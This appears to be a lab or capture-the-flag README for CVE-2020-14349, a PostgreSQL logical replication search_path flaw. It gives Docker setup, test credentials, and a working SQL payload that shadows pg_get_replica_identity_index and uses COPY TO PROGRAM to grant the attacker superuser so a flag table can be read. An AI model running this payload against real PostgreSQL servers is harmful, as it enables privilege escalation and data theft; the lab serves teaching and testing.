# CVE-2020-14349: PostgreSQL Logical Replication search_path Vulnerability

This vulnerability exists in PostgreSQL versions before 12.4. The issue is that logical replication connections don't reset their search_path, allowing an attacker to create malicious functions in the public schema that will be called instead of the system functions.

## Setup

1. Build and start the container:
```bash
docker-compose up --build
```

2. Connect to the database:
```bash
psql -h localhost -U user1 -d db1
# Password: password
```

## Exploitation

1. Create a malicious function in the public schema that will be called instead of pg_get_replica_identity_index:

```sql
CREATE OR REPLACE FUNCTION public.pg_get_replica_identity_index(int)
RETURNS regclass
LANGUAGE plpgsql
AS $$
BEGIN
    COPY (SELECT 1) TO PROGRAM '/pg12/postgres/bin/psql -c "ALTER USER user1 WITH SUPERUSER;" postgres';
    RETURN pg_catalog.pg_get_replica_identity_index($1);
END;
$$;
```

2. Wait for the script to resynchronize the table (runs every minute)

3. Connect to the secret database and read the flag:
```sql
\c secret_db
SELECT * FROM secret_table;
```

## Technical Details

The vulnerability exists because logical replication connections don't reset their search_path to a safe value. When the replication connection is established, it will look for functions in the public schema first before checking pg_catalog. By creating a malicious function with the same name as a system function, we can trick the replication process into executing our code with elevated privileges.

This vulnerability was fixed in PostgreSQL 12.4 by ensuring that logical replication connections always use a safe search_path. 